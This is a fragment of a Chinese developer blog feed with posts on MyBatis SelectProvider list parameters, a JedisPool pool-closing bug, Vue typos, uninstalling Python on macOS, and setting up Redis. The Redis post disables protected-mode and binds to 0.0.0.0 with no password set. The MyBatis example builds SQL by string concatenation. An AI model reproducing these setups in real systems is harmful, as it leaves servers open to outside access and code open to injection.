class="attr">"userId"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"questionId"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"likeState"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"commentCount"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"question"</span>: &#123;</span><br><span class="line">                    <span class="attr">"questionId"</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="attr">"questionTitle"</span>: <span class="string">"Spring，Django，Rails，Express这些框架技术的出现都是为了解决什么问题，现在这些框架都应用在哪些方面？"</span>,</span><br><span class="line">                    <span class="attr">"createTime"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"userId"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"user"</span>: <span class="literal">null</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"user"</span>: &#123;</span><br><span class="line">                    <span class="attr">"userId"</span>: <span class="number">11218</span>,</span><br><span class="line">                    <span class="attr">"weiboUserId"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"email"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"username"</span>: <span class="string">"amosamos"</span>,</span><br><span class="line">                    <span class="attr">"password"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"joinTime"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"avatarUrl"</span>: <span class="string">"https://avatars3.githubusercontent.com/u/16012509?s=400&amp;u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&amp;v=4"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"answerCommentList"</span>: <span class="literal">null</span></span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本着更深入地使用注解来开发，慢慢地发现脱离了XML的MyBatis好多好多的坑。我觉得很大的原因还是来自于官方文档的不完善，以及使用注解开发
      
    
    </summary>
    
    
      <category term="SpringBoot" scheme="https://amosannn.github.io/tags/SpringBoot/"/>
    
      <category term="MyBatis" scheme="https://amosannn.github.io/tags/MyBatis/"/>
    
  </entry>
  
  <entry>
    <title>在SelectProvider注解中使用复杂类型参数（List）</title>
    <link href="https://amosannn.github.io/2018/03/03/SelectProvider-use-List-parameter/"/>
    <id>https://amosannn.github.io/2018/03/03/SelectProvider-use-List-parameter/</id>
    <published>2018-03-03T15:50:39.000Z</published>
    <updated>2018-03-03T16:39:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近开发中尝试使用注解来代替xml完成Mybatis的sql编写，实现更完(装)整(逼)的无xml编程。结果没写多久就跌进大坑了Orz</p><p>总所周知的是Mybatis支持的注解中有@Select、@Insert、@Update、@Delete这四个基本操作。使用这些注解你可以非常快的完成基础操作，如果想执行一些复杂操作，例如包含where、foreach等xml中一个标签即可完成的操作，便需要用到另一个注解 –&gt; @SelectProvider</p><p>如果你的需求只是传递一些基础类型，那你学习使用SelectProvider的曲线还是很平滑的。如果你的需求是传递一些复杂类型，例如List，那就可能会尴尬了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">QuestionMapper</span> </span>&#123;</span><br><span class="line">  <span class="meta">@SelectProvider</span>(type = QuestionSqlProvider.class, method = <span class="string">"listQuestionByQuestionId"</span>)</span><br><span class="line">  <span class="function">List&lt;Question&gt; <span class="title">listQuestionByQuestionId</span><span class="params">(@Param(<span class="string">"idList"</span>)</span> List&lt;Integer&gt; idList)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始我理所当然的把List<integer>作为输入参数。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">listQuestionByQuestionId</span><span class="params">(<span class="keyword">final</span> List&lt;Integer&gt; idList)</span> </span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    sb.append(<span class="string">"("</span>);</span><br><span class="line">    <span class="keyword">for</span> (Integer questionId : idList) &#123;</span><br><span class="line">      sb.append(<span class="string">" '"</span> + questionId + <span class="string">"',"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sb.deleteCharAt(sb.length() - <span class="number">1</span>);</span><br><span class="line">    sb.append(<span class="string">")"</span>);</span><br><span class="line">    System.out.println(sb.toString());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> SQL() &#123;&#123;</span><br><span class="line">      SELECT(<span class="string">" question_id,question_title,create_time "</span>);</span><br><span class="line">      FROM(<span class="string">" question "</span>);</span><br><span class="line">      WHERE(<span class="string">" question_id in "</span> + sb.toString());</span><br><span class="line">    &#125;&#125;.toString();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></integer></p><p>燃鹅。。jvm很无情的抛了个错误出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00:29:39.814 [http-nio-8080-exec-1] DEBUG o.s.web.servlet.DispatcherServlet - Could not complete request</span><br><span class="line">org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.builder.BuilderException: Error invoking SqlProvider method (com.amosannn.mapper.QuestionSqlProvider.listQuestionByQuestionId).  Cause: org.apache.ibatis.binding.BindingException: Parameter &apos;arg0&apos; not found. Available parameters are [idList, param1]</span><br></pre></td></tr></table></figure></p><p>很难受，Mybatis的官方文档里并没有针对@SelectProvider有更多的demo，翻遍了各大门户网站也没见到有相关的讨论。兜兜转转依旧没有眉目，想到多参数的传递会被Mybatis自动封装进Map，该不会List也是同样被封装进Map吧。结果一试还真是这样。。</p><p>终于摸索出问题的关键，只需把形参由List<integer>类型替换为Map类型就能接收到前面传来的List了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuestionSqlProvider</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">listQuestionByQuestionId</span><span class="params">(<span class="keyword">final</span> Map&lt;String, Object&gt; map)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; idList = (List&lt;Integer&gt;)map.get(<span class="string">"idList"</span>);</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    sb.append(<span class="string">"("</span>);</span><br><span class="line">    <span class="keyword">for</span> (Integer questionId : idList) &#123;</span><br><span class="line">      sb.append(<span class="string">" '"</span> + questionId + <span class="string">"',"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sb.deleteCharAt(sb.length() - <span class="number">1</span>);</span><br><span class="line">    sb.append(<span class="string">")"</span>);</span><br><span class="line">    System.out.println(sb.toString());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> SQL() &#123;&#123;</span><br><span class="line">      SELECT(<span class="string">" question_id,question_title,create_time "</span>);</span><br><span class="line">      FROM(<span class="string">" question "</span>);</span><br><span class="line">      WHERE(<span class="string">" question_id in "</span> + sb.toString());</span><br><span class="line">    &#125;&#125;.toString();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></integer></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近开发中尝试使用注解来代替xml完成Mybatis的sql编写，实现更完(装)整(逼)的无xml编程。结果没写多久就跌进大坑了Orz&lt;/p&gt;
&lt;p&gt;总所周知的是Mybatis支持的注解中有@Select、@Insert、@Update、@Delete这四个基本操作。使用这
      
    
    </summary>
    
    
      <category term="Mybatis" scheme="https://amosannn.github.io/tags/Mybatis/"/>
    
  </entry>
  
  <entry>
    <title>JedisPool报错：Could not return the resource to the pool</title>
    <link href="https://amosannn.github.io/2018/01/30/jedispool-could-not-return-resource-error/"/>
    <id>https://amosannn.github.io/2018/01/30/jedispool-could-not-return-resource-error/</id>
    <published>2018-01-30T07:08:45.000Z</published>
    <updated>2018-01-30T07:58:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Bug的起源和解法"><a href="#Bug的起源和解法" class="headerlink" title="Bug的起源和解法"></a>Bug的起源和解法</h1><p>这个错误来的实在猝不及防，第一次请求可以成功使用<code>JedisPool</code>，而第二次请求便会报错，在翻遍了所有相关博客后一度以为是自己的配置出了错，于是不断修改配置文件中的redis连接池参数。<br>折腾老半天之后，没有帮助TAT<br>这时，我想起10年前的某个午后，蝉鸣的空气中传来的几分安定，出神地趴在窗边看麻雀扑腾的我，被一声厉呵带回现实。之后便到了标准环节–”下课到办公室找我”。之后的事情便记不太清了，只是我深深地记得当时的心境，想不出的问题换个角度想，一定会有不同的发现。<br>那就回归报错吧，“无法将资源返回到池”，再回想到我的jedisPool对象，旷的一声，仿佛天旋地转一般，一切的一切突然都变透彻了。</p><h2 id="错误根源及出错原因"><a href="#错误根源及出错原因" class="headerlink" title="错误根源及出错原因"></a>错误根源及出错原因</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">followUser</span><span class="params">(Integer localUserId, Integer userId)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> (Jedis jedis = jedisPool.getResource()) &#123;</span><br><span class="line">    jedis.zadd(localUserId + RedisKey.FOLLOW_USER, System.currentTimeMillis(),</span><br><span class="line">        String.valueOf(userId));</span><br><span class="line">    jedis.zadd(userId + RedisKey.FOLLOWED_USER, System.currentTimeMillis(),</span><br><span class="line">        String.valueOf(localUserId));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (JedisException e) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  jedisPool.close();<span class="comment">// 问题就出在这里</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JedisPool在configuration类中初始化（项目启动时有spring自动扫描）<br>然而在每个业务类调用完之后就被手动关闭，自然执行完第一次后就不再能取出resource的，也无法return。<br>解决这个bug只需把每个service实现类中的<code>jedisPool.close()</code>删去即可。</p><h2 id="为什么会出现这种写法"><a href="#为什么会出现这种写法" class="headerlink" title="为什么会出现这种写法"></a>为什么会出现这种写法</h2><p>说到这个就不得不提起Jedis的wiki<br>官方po出的demo是这样使用jedis的：  </p><h3 id="首先引入pom"><a href="#首先引入pom" class="headerlink" title="首先引入pom"></a>首先引入pom</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;redis.clients&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jedis&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.9.0&lt;/version&gt;</span><br><span class="line">    &lt;type&gt;jar&lt;/type&gt;</span><br><span class="line">    &lt;scope&gt;compile&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="然后实例化JedisPool"><a href="#然后实例化JedisPool" class="headerlink" title="然后实例化JedisPool"></a>然后实例化JedisPool</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JedisPool pool = <span class="keyword">new</span> JedisPool(<span class="keyword">new</span> JedisPoolConfig(), <span class="string">"localhost"</span>);</span><br></pre></td></tr></table></figure><h3 id="接着实例化jedis有两种方法"><a href="#接着实例化jedis有两种方法" class="headerlink" title="接着实例化jedis有两种方法"></a>接着实例化jedis有两种方法</h3><ol><li><p>try-with-resource法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// Jedis implements Closeable. Hence, the jedis instance will be auto-closed after the last statement.</span></span><br><span class="line"><span class="keyword">try</span> (Jedis jedis = pool.getResource()) &#123;</span><br><span class="line">  <span class="comment">/// ... do stuff here ... for example</span></span><br><span class="line">  jedis.set(<span class="string">"foo"</span>, <span class="string">"bar"</span>);</span><br><span class="line">  String foobar = jedis.get(<span class="string">"foo"</span>);</span><br><span class="line">  jedis.zadd(<span class="string">"sose"</span>, <span class="number">0</span>, <span class="string">"car"</span>); jedis.zadd(<span class="string">"sose"</span>, <span class="number">0</span>, <span class="string">"bike"</span>); </span><br><span class="line">  Set&lt;String&gt; sose = jedis.zrange(<span class="string">"sose"</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/// ... when closing your application:</span></span><br><span class="line">pool.close();<span class="comment">// 这便是原罪</span></span><br></pre></td></tr></table></figure></li><li><p>手动关闭jedis法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Jedis jedis = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  jedis = pool.getResource();</span><br><span class="line">  <span class="comment">/// ... do stuff here ... for example</span></span><br><span class="line">  jedis.set(<span class="string">"foo"</span>, <span class="string">"bar"</span>);</span><br><span class="line">  String foobar = jedis.get(<span class="string">"foo"</span>);</span><br><span class="line">  jedis.zadd(<span class="string">"sose"</span>, <span class="number">0</span>, <span class="string">"car"</span>); jedis.zadd(<span class="string">"sose"</span>, <span class="number">0</span>, <span class="string">"bike"</span>); </span><br><span class="line">  Set&lt;String&gt; sose = jedis.zrange(<span class="string">"sose"</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">  <span class="comment">// You have to close jedis object. If you don't close then</span></span><br><span class="line">  <span class="comment">// it doesn't release back to pool and you can't get a new</span></span><br><span class="line">  <span class="comment">// resource from pool.</span></span><br><span class="line">  <span class="keyword">if</span> (jedis != <span class="keyword">null</span>) &#123;</span><br><span class="line">    jedis.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/// ... when closing your application:</span></span><br><span class="line">pool.close();</span><br></pre></td></tr></table></figure></li></ol><p>虽然不在报错了，但是现在不关的话又不知道在哪能关的了它了。。。</p><hr><p>双手奉上： <a href="https://github.com/xetorthio/jedis/wiki/Getting-started" target="_blank" rel="noopener">Jedis官方指引</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Bug的起源和解法&quot;&gt;&lt;a href=&quot;#Bug的起源和解法&quot; class=&quot;headerlink&quot; title=&quot;Bug的起源和解法&quot;&gt;&lt;/a&gt;Bug的起源和解法&lt;/h1&gt;&lt;p&gt;这个错误来的实在猝不及防，第一次请求可以成功使用&lt;code&gt;JedisPool&lt;/c
      
    
    </summary>
    
    
      <category term="java" scheme="https://amosannn.github.io/tags/java/"/>
    
      <category term="jedis" scheme="https://amosannn.github.io/tags/jedis/"/>
    
      <category term="redis" scheme="https://amosannn.github.io/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>Vue开发路上遇到的坑儿们</title>
    <link href="https://amosannn.github.io/2018/01/24/vue-error-collection/"/>
    <id>https://amosannn.github.io/2018/01/24/vue-error-collection/</id>
    <published>2018-01-24T02:52:06.000Z</published>
    <updated>2018-01-24T03:18:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h1><p>此文仅用于记录vue开发中遇到的各种奇葩事。</p><h1 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h1><h2 id="项目不报错但是路由不加载"><a href="#项目不报错但是路由不加载" class="headerlink" title="项目不报错但是路由不加载"></a>项目不报错但是路由不加载</h2><p>前方预警：这是个低级错误Orz<br>index.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &apos;/&apos;,</span><br><span class="line">      name: &apos;Index&apos;,</span><br><span class="line">      component: &#123;</span><br><span class="line">        nav: Navv,</span><br><span class="line">        main: Index,</span><br><span class="line">        footer: Footter</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>App.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">    &lt;router-view name=&quot;nav&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;router-view name=&quot;main&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">    &lt;router-view name=&quot;footer&quot;&gt;&lt;/router-view&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></p><p>如果你和我一样是只小白菜，可能咋一看会发现没什么毛病，仔细一看就会发现路由配置里的<code>components</code>被我写成了·component·。。<br>vue中到目前为止我知道的两种路由配置方式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 第一种</span><br><span class="line">...</span><br><span class="line">component: navv</span><br><span class="line">...</span><br><span class="line">// 第二种</span><br><span class="line">components: &#123;</span><br><span class="line">navv</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>over, 经验值 +1</p><h2 id="Failed-to-execute-‘setAttribute’-on-‘Element’-‘method-’-is-not-a-valid-attribute-name"><a href="#Failed-to-execute-‘setAttribute’-on-‘Element’-‘method-’-is-not-a-valid-attribute-name" class="headerlink" title="Failed to execute ‘setAttribute’ on ‘Element’: ‘method+’ is not a valid attribute name."></a>Failed to execute ‘setAttribute’ on ‘Element’: ‘method+’ is not a valid attribute name.</h2><p>由于项目中引入了饿了么开发的组件库·element-ui·，所以一度以为是和我引入的css文件起了冲突？？甚至我还去执行了<code>npm uninstall element-ui</code>这条命令。最后实在没办法了，一段一段代码排查问题，找到一个诡异的地方。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;/listTopic&quot; method+=&quot;post&quot;&gt;</span><br><span class="line">  &lt;input name=&quot;topicName&quot; type=&quot;text&quot; class=&quot;search-input&quot; placeholder=&quot;搜索你感兴趣的内容...&quot;&gt;</span><br><span class="line">  &lt;button type=&quot;submit&quot; class=&quot;search-button&quot;&gt;&lt;i class=&quot;sprite-search&quot;&gt;&lt;/i&gt;&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><p>噗。。form标签下的method方法多了个+号。。。想拿头去撞豆腐了。<br>ok，经验值 +1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;开篇&quot;&gt;&lt;a href=&quot;#开篇&quot; class=&quot;headerlink&quot; title=&quot;开篇&quot;&gt;&lt;/a&gt;开篇&lt;/h1&gt;&lt;p&gt;此文仅用于记录vue开发中遇到的各种奇葩事。&lt;/p&gt;
&lt;h1 id=&quot;错误&quot;&gt;&lt;a href=&quot;#错误&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="vue" scheme="https://amosannn.github.io/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>如何删除自己安装的python(干净、无残留)</title>
    <link href="https://amosannn.github.io/2017/12/24/remove-your-own-python/"/>
    <id>https://amosannn.github.io/2017/12/24/remove-your-own-python/</id>
    <published>2017-12-24T13:27:15.000Z</published>
    <updated>2017-12-24T14:33:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近又折腾起了python，于是发现很久以前的自己在各个地方留下了python的足迹，简直就是个更新日志。。<br>既然习惯了brew这个管家，那就把以前的坑都填好吧！</p><p>安装软件的时候很快活，卸载的时候就难受的不行，不熟悉系统目录，你就根本卸不干净。<br>当然市面上有很多pkg卸载软件，但是强迫症的自己总觉得它卸不干净~。~</p><p>搜了一票国内论坛。。还是跑去StackOverFlow，找到了一个靠谱回答。<br>答主提供了python官网的反馈页面，是一位不知如何完整卸载python的网友提交的反馈。<br>一个叫<code>Ned Deily</code>的朋友提取了安装目录并将其制成卸载脚本（详情见参考链接）<br>知道了该删哪就可以动手了…</p><a id="more"></a><ol><li><p>python框架</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /Library/Frameworks/Python.framework/Versions/x.x</span><br></pre></td></tr></table></figure></li><li><p>python应用目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf "/Applications/Python x.x"</span><br></pre></td></tr></table></figure></li><li><p><code>/usr/local/bin</code>下的软连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/bin/</span><br><span class="line">ls -l /usr/local/bin | grep '../Library/Frameworks/Python.framework/Versions/x.x' | awk '&#123;print $9&#125;' | tr -d @ | xargs rm</span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果想检查一下有没有删干净</span></span><br><span class="line">ls -l /usr/local/bin | grep '../Library/Frameworks/Python.framework/Versions/x.x'</span><br></pre></td></tr></table></figure></li><li><p>若有环境变量等系统配置文件的配置，需另行手动删除</p><ul><li>~/.bash_login</li><li>~/.bash_profile</li><li>~/.cshrc</li><li>~/.profile</li><li>~/.tcshrc</li><li>~/.zprofile</li></ul></li></ol><p>以上的<code>x.x</code>都为python版本号，自行替换即可。</p><hr><p>参考链接：<br><a href="https://bugs.python.org/issue7107" target="_blank" rel="noopener">Python Bug Tracker</a><br><a href="https://stackoverflow.com/questions/3819449/how-to-uninstall-python-2-7-on-a-mac-os-x-10-6-4/3819829#3819829" target="_blank" rel="noopener">How to uninstall Python 2.7 on a Mac OS X 10.6.4?</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近又折腾起了python，于是发现很久以前的自己在各个地方留下了python的足迹，简直就是个更新日志。。&lt;br&gt;既然习惯了brew这个管家，那就把以前的坑都填好吧！&lt;/p&gt;
&lt;p&gt;安装软件的时候很快活，卸载的时候就难受的不行，不熟悉系统目录，你就根本卸不干净。&lt;br&gt;当然市面上有很多pkg卸载软件，但是强迫症的自己总觉得它卸不干净~。~&lt;/p&gt;
&lt;p&gt;搜了一票国内论坛。。还是跑去StackOverFlow，找到了一个靠谱回答。&lt;br&gt;答主提供了python官网的反馈页面，是一位不知如何完整卸载python的网友提交的反馈。&lt;br&gt;一个叫&lt;code&gt;Ned Deily&lt;/code&gt;的朋友提取了安装目录并将其制成卸载脚本（详情见参考链接）&lt;br&gt;知道了该删哪就可以动手了…&lt;/p&gt;
    
    </summary>
    
    
      <category term="mac" scheme="https://amosannn.github.io/tags/mac/"/>
    
      <category term="python" scheme="https://amosannn.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Redis从安装到踩坑</title>
    <link href="https://amosannn.github.io/2017/11/29/redis-install/"/>
    <id>https://amosannn.github.io/2017/11/29/redis-install/</id>
    <published>2017-11-29T08:13:02.000Z</published>
    <updated>2017-12-24T14:28:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>先贴Redis官网：<a href="https://redis.io/download" target="_blank" rel="noopener">https://redis.io/download</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget http://download.redis.io/releases/redis-4.0.2.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar xzf redis-4.0.2.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> redis-4.0.2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p>如果没有安装gcc，则会抛出这样的错误：<br><img src="/images/redis_install/redis_install_error.png" alt=""><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum install gcc</span></span><br></pre></td></tr></table></figure></p><p>在执行一次make可能会再抛出这样一个错误：<br><img src="/images/redis_install/redis_install_error2.png" alt=""></p><p>这样的话便在make后加上参数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> make MALLOC=libc</span></span><br></pre></td></tr></table></figure></p><p>编译完成后<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> src/redis-server  redis.conf</span></span><br></pre></td></tr></table></figure></p><a id="more"></a><p>当看到这个画面redis就启动完成了<br><img src="/images/redis_install/redis_running.png" alt=""></p><p>新建一个链接（开启新的终端或新的ssh标签页）<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/redis-4.0.2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> src/redis-cli</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/redis_install/redis_test.png" alt=""><br>至此大功告成，如果想学习redis命令，则点击：xxx.xxx/xxx</p><p>二：redis开启外部访问<br>远程连接redis访问被拒绝，初步推断为redis配置问题。<br>开了另一台服务器redis-cli远程连接，发现如下错误<br><img src="/images/redis_install/denied_of_protected_mode.png" alt=""><br>由图中可知，要想外部访问当前redis服务，需关闭安全模式。</p><p>关闭安全模式<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi redis.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更改protected-mode 由yes 改成 no</span></span><br></pre></td></tr></table></figure></p><p>关闭并重启后发现依旧访问被拒。<br><img src="/images/redis_install/denied_of_127_binded.png" alt=""></p><p>一波操作之后发现，需修改默认配置文件中的bind配置<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 更改 <span class="built_in">bind</span> 127.0.0.1 为 <span class="built_in">bind</span> 0.0.0.0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重启redis后便可使用cmd或terminal测试连接</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h &#123;redis_host&#125; -p 